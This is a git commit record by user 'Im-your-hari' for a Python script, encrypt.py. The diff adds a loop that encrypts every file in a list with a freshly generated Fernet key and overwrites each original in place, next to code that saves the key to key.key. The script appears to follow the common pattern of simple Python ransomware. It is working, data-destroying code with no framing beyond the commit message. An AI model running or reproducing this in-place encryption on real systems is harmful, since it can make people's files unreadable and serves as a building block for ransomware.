1d419c0699046d9969891e4acb201e2354b91675
Im-your-hari <51747755+Im-your-hari@users.noreply.github.com>
2023-09-21 01:30:01 +0530

    Update encrypt.py

--- encrypt.py
+++ encrypt.py
@@ -18,3 +18,10 @@ key = Fernet.generate_key()
 with open('key.key','wb') as thekey:
   thekey.write(key)
 
+for file in files:
+  with open(file,'rb') as thefile:
+    contents = thefile.read()
+  contents_encrypted = Fernet(key).encrypt(contents)
+  with open(file,'wb') as thefile:
+    thefile.write(contents_encrypted)
+
